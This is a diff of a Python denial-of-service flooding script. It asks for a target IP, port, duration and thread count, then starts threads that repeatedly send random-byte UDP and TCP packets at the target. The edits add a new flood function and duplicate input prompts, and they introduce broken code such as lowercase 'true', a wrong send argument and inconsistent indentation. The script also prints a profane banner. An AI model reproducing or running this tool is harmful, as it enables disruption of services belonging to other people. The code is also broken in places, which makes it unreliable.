@@ -8,21 +8,24 @@ import time
 import fade
 os.system("clear")
 
+# Colors
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKCYAN = '\033[96m'
     OKGREEN = '\033[92m'
     WARNING = '\033[93m'
-    ZA1 = '\033[31m'
-    ZA2 = '\033[32m'
-    ZA3 = '\033[33m'
-    FAIL = '\033[91m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-    ZH = '\033[97m'
-
+    PURPLE = '\033[97m'
+    BOLD    = "\033[1m"
+    BLACK   = "\033[30m"
+    RED     = "\033[31m"
+    GREEN   = "\033[32m"
+    YELLOW  = "\033[33m"
+    BLUE    = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN    = "\033[36m"
+    WHITE   = "\033[37m"
 
 attemps = 0
 os.system("clear")
@@ -58,6 +61,7 @@ while attemps < 100:
 
 ip = str(input("\033[94mTarget IP :  \033[0m"))
 port = int(input("\033[97mTarget Port :  \033[0m"))
+choice = str(input("\033[31m (y/n) :  \033[0m"))
 times = int(input("\033[96mTime : \033[0m"))
 threads = int(input("\033[92mThreads :  \033[0m"))
 time.sleep(5),
@@ -72,6 +76,11 @@ time.sleep(5),
 print("\033[95m               ⟩⟩  FUCK U MURDER \033[0m "),
 time.sleep(5),
 
+ip = str(input(" Target IP :"))
+port = int(input(" Target Port :"))
+choice = str(input(" (y/n) :"))
+times = int(input(" Time :"))
+threads = int(input(" Threads :"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]"))
@@ -81,27 +90,38 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
+			print(i +"Attack Sent!!!")
 		except:
-			print("\033[33m[\033[95m!\033[33m] Error!")
+			print("[!] Error!!!")
 
 def run2():
+	data = random._urandom(20000)
+        i = random.choice(("[+]"))
+        while true:
+		try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        s.sendto(bytes, (ip,port))
+                        print(i +"Attack Sent!!!")
+		 except:
+			print("[!] Error!!!")
+
+def run3():
 	data = random._urandom(999)
 	i = random.choice(("[+]"))
-	while True:
+	while true:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("\033[33m[\033[91m+\033[33m] \033[33mStart Attack :::..." +ip+ " \033[0m")
+			print(i +"Attack Sent!!!")
 		except:
 			s.close()
-			print("\033[33m[\033[95m!\033[33m] Error!")
+			print("[*] Error!!!")
             
 
-def run3():
+def run4():
 	data = random._urandom(818)
 	i = random.choice(("[+]"))
 	while True:
@@ -111,13 +131,13 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("\033[31m[\033[32m!\033[31m] \033[32mStatus Sent ::::..." +ip+ " \033[0m")
+			print(i +"Attack Sent!!!")
 		except:
 			s.close()
-			print("\033[93m[\033[95m!\033[93m] Error!")
+			print("[-] Error!!!")
             
   
-def run4():
+def run5():
 	data = random._urandom(16)
 	i = random.choice(("[+]"))
 	while True:
@@ -127,11 +147,12 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("\033[94m[\033[91m+\033[94m] \033[36mRequest Sent :::..  " +ip+ " \033[0m")
+			print(i +"Attack Sent!!!")
 		except:
 			s.close()
-			print("\033[33m[\033[95m!\033[33m] Error!")
-											
+			print("[-] Error!!!")
+
+
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
@@ -143,3 +164,6 @@ for y in range(threads):
 else:
 		th = threading.Thread(target = run4)
 		th.start()
+
+
+
